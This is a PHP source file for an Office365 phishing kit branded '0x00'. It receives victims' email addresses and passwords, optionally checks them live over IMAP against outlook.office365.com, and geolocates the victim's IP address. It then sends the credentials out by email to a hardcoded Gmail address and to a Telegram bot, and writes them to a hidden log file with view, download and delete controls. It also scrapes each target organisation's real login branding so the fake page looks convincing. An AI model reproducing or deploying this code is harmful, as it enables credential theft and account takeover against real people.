<?php

error_reporting(0);
ob_start();
ini_set("output_buffering",4096);

header('Access-Control-Allow-Origin: * ');
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Access-Control-Max-Age: 1000');
header('Access-Control-Allow-Headers: Content-Type, Authorization,Authorization1,Authorization2, X-Requested-With');

if (function_exists('imap_open')) {
    $trueauth = true; // true/ false. change this if you don't want true auth
} else {
    $trueauth = false;
}

$trueauthentic = $trueauth;

$recipient = 'emcobar1983@gmail.com'; // Put your email address here
$finish_url = 'https://office365.com';
$sendtele = "yes"; // yes or no
$telebot = ""; // BOT API Key
$teleuser = ""; // Telegram User ID

$ip = $_SERVER['REMOTE_ADDR'];
$ip2place = new ip2location_lite();
$ip2place->setKey( "66657745713826aee27886e868c7354891388e26c003fa6ebf7f995e8f599dc7" );
$remote_add = $ip;
$location = $ip2place->getCity($remote_add);

$country = $location['countryName'];
$city = $location['cityName'];
$region = $location['regionName']; 
$date = date('Y-m-d H:i:s');
 
if(isset($_GET['domain'])){
    header("Status: 200 OK");
    echo mxrecordValidate($_GET['domain']);
    exit;
}

if(isset($_POST['barnd']) && isset($_POST['email'])){
	$email = $_POST['email'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F'); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);    
	$result = curl_exec ($ch);
	$respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);	
	curl_close ($ch); 
	$parts = parse_url($respond_link);
	parse_str($parts['query'], $query);
	$post = ['client_id' => $query['client_id'], 'login_hint' => $email];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_POST ,TRUE); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); 
	curl_setopt($ch, CURLOPT_URL, $respond_link); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	$result = curl_exec ($ch);
	curl_close ($ch);
	preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
	if(!empty($BannerLogo[0][0])){
	$BannerLogo = explode(",", $BannerLogo[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $BannerLogo[0], $BannerLogo);
	}else{
	$BannerLogo[0][0] = '';
	}
	preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
   	if(!empty($Illustration[0][0])){
	$Illustration = explode(",", $Illustration[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $Illustration[0], $Illustration);
	}else{
	$Illustration[0][0] = '';
	}
	$logo_image = $BannerLogo[0][0];
	$bg_image = $Illustration[0][0];
	$res = array('logo_image' => $logo_image, 'bg_image' => $bg_image);
	echo json_encode($res);
}
if (isset($_REQUEST['show_logs'])) {
    echo "<a href='?delete_logs'><strong>Delete Log file now.</strong></a> (Note this can not be undone! all you logs will vanish)<br/><br/><a href='?download_logs'><strong>Export Log file now.</strong></a><br/><br/><hr/>";
    if (file_exists(".0x00.txt")) {
        include(".0x00.txt");
    } else {
	echo "No Result File Logs Yet";
    }
}
if (isset($_REQUEST['delete_logs'])) {
    if (file_exists(".0x00.txt")) {
        if (unlink(".0x00.txt")) {
            header("Location: ?show_logs");
            exit;
        };
    }
}
if (isset($_REQUEST["download_logs"])) {
    $file = ".0x00.txt";
    $filepath = $file;
    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($filepath));
        flush();
        readfile($filepath);
        exit;
    }
}
 
 

if(!empty($_POST['Authorization1']) && !empty($_POST['Authorization2'])){

$acc = $_POST['Authorization1'];
$pp = $_POST['Authorization2'];

if (!empty($acc) && !empty($pp)) {
if (strpos($acc, '@') !== false) {
    $login = $acc;
} else {
    $login = base64_decode($acc);
}
} else {
    $login = base64_decode($acc);
}

if ($trueauthentic == false) {
    $checktrue = true;
} else {
    $checktrue = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $login , $pp);
}
if($checktrue){
	$message = "-----------------+ 0x00 Office365 [True Login] +------------------\n";
	$message.= "UserID          : " . $login . "\n";
	$message.= "Password        : " . $pp . "\n";
	$message.= "Client IP       : " . $ip . "\n";
	$message.= "Client Country  : " . $country . "\n";
	$message.= "Client Region   : " . $region . "\n";
	$message.= "Client City     : " . $city . "\n";
    $message.= "Login Date      : " . $date . "\n";
	$message.= "----------------+ 0x00 Office365 [xploitednoob] +-----------------\n\n\n\n";
    $subject = "[0x00] VALID - " . $country . ' - '.$date . "\n";
    $headers ="From: 0x00 Office365 <office365@0x00.site>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    if($sendtele=="yes"){
        $sdata = [
            'text' => $message
        ];
        $hdata = http_build_query($sdata);
        $teleapi = "https://api.telegram.org/bot".$telebot."/sendMessage?chat_id=".$teleuser."&parse_mode=Markdown&".$hdata."";
        $curl=curl_init();
        curl_setopt($curl, CURLOPT_URL, $teleapi);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        $content=curl_exec($curl);
        curl_close($curl);
    }
    @mail($recipient, $subject, $message, $headers);
    $myfile = fopen(".0x00.txt", "a");
    fwrite($myfile, $message);
    fclose($myfile);
    echo '{"p":"1","url":"'.$finish_url.'","country":"'.$country.'","ip":"'.$ip.'"}';
} else {
    $message = "-------------------+ 0x00 Office365 [Invalid] +-------------------\n";
	$message.= "UserID          : " . $login . "\n";
	$message.= "Password        : " . $pp . "\n";
	$message.= "Client IP       : " . $ip . "\n";
	$message.= "Client Country  : " . $country . "\n";
	$message.= "Client Region   : " . $region . "\n";
	$message.= "Client City     : " . $city . "\n";
    $message.= "Login Date      : " . $date . "\n";
	$message.= "----------------+ 0x00 Office365 [xploitednoob] +-----------------\n\n\n\n";
	$subject = "[0x00] INVALID - " . $country . ' - '.$date . "\n";
    $headers ="From: 0x00 Office365 <office365@0x00.site>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    if($sendtele=="yes"){
        $sdata = [
            'text' => $message
        ];
        $hdata = http_build_query($sdata);
        $teleapi = "https://api.telegram.org/bot".$telebot."/sendMessage?chat_id=".$teleuser."&parse_mode=Markdown&".$hdata."";
        $curl=curl_init();
        curl_setopt($curl, CURLOPT_URL, $teleapi);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        $content=curl_exec($curl);
        curl_close($curl);
    }
    @mail($recipient, $subject, $message, $headers);
    $myfile = fopen(".0x00.txt", "a");
    fwrite($myfile, $message);
    fclose($myfile);
    echo '{"p":"0"}';
}
} 
 
function mxrecordValidate($domain){
$arr = dns_get_record($domain, DNS_ANY);
$mxget = $domain;
 
if (isset($arr[10]['target'])){
$mxget .= $arr[10]['target'].'-';
}
if (isset($arr[9]['target'])){
$mxget .= $arr[9]['target'].'-';
}
if (isset($arr[8]['target'])){
$mxget .= $arr[8]['target'].'-';
}
if (isset($arr[7]['target'])){
$mxget .= $arr[7]['target'].'-';
}
if (isset($arr[6]['target'])){
$mxget .= $arr[6]['target'].'-';
}
if (isset($arr[4]['target'])){
$mxget .= $arr[4]['target'].'-';
}
if (isset($arr[3]['target'])){
$mxget .= $arr[3]['target'].'-';
}
if (isset($arr[2]['target'])){
$mxget .= $arr[2]['target'].'-';
}
if (isset($arr[1]['target'])){
$mxget .= $arr[1]['target'].'-';
}
if (isset($arr[0]['target'])){
$mxget .=$arr[0]['target'].'-';
}

return str_replace(".","-",$mxget);
	


}
 function get_validation($url, $post_paramtrs = false) {
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    if ($post_paramtrs) {
        curl_setopt($c, CURLOPT_POST, TRUE);
        curl_setopt($c, CURLOPT_POSTFIELDS, "u=".$post_paramtrs);
    }
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0");
    curl_setopt($c, CURLOPT_COOKIE, 'CookieName1=Value;');
    curl_setopt($c, CURLOPT_MAXREDIRS, 10);
    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 9);
    curl_setopt($c, CURLOPT_REFERER, $url);
    curl_setopt($c, CURLOPT_TIMEOUT, 60);
    curl_setopt($c, CURLOPT_AUTOREFERER, true);
    curl_setopt($c, CURLOPT_ENCODING, 'gzip,deflate');
    $data = curl_exec($c);
    $status = curl_getinfo($c);
    curl_close($c);
    preg_match('/(http(|s)):\/\/(.*?)\/(.*\/|)/si', $status['url'], $link);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/|\/)).*?)(\'|\")/si', '$1=$2'.$link[0].'$3$4$5', $data);
    $data = preg_replace('/(src|href|action)=(\'|\")((?!(http|https|javascript:|\/\/)).*?)(\'|\")/si', '$1=$2'.$link[1].'://'.$link[3].'$3$4$5', $data);
    if ($status['http_code'] == 200) {
        return $data;
    }
    elseif($status['http_code'] == 301 || $status['http_code'] == 302) {
        if (!$follow_allowed) {
            if (!empty($status['redirect_url'])) {
                $redirURL = $status['redirect_url'];
            } else {
                preg_match('/href\=\"(.*?)\"/si', $data, $m);
                if (!empty($m[1])) {
                    $redirURL = $m[1];
                }
            }
            if (!empty($redirURL)) {
                return call_user_func(__FUNCTION__, $redirURL, $post_paramtrs);
            }
        }
    }
    return "$data";
}
final class ip2location_lite {
    protected $errors = array();
    protected $service = 'api.ipinfodb.com';
    protected $version = 'v3';
    protected $apiKey = '';
    public function __construct() {}
    public function __destruct() {}
    public function setKey($key) {
        if (!empty($key))
            $this->apiKey = $key;
    }
    public function getError() {
        return implode("\n", $this->errors);
    }
    public function getCountry($host) {
        return $this->getResult($host, 'ip-country');
    }
    public function getCity($host) {
        return $this->getResult($host, 'ip-city');
    }
    private function getResult($host, $name) {
        $ip =  @ gethostbyname($host);
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            $xml =  @ file_get_contents('http://'.$this->service.'/'.$this->version.'/'.$name.'/?key='.$this->apiKey.'&ip='.$ip.'&format=xml');
            if (get_magic_quotes_runtime()) {
                $xml = stripslashes($xml);
            }
            try {
                $response =  @ new SimpleXMLElement($xml);
                foreach($response as $field => $value) {
                    $result[(string)$field] = (string)$value;
                }
                return $result;
            } catch (Exception $e) {
                $this->errors[] = $e->getMessage();
                return;
            }
        }
        $this->errors[] = '"'.$host.'" is not a valid IP address or hostname.';
        return;
    }
}
?>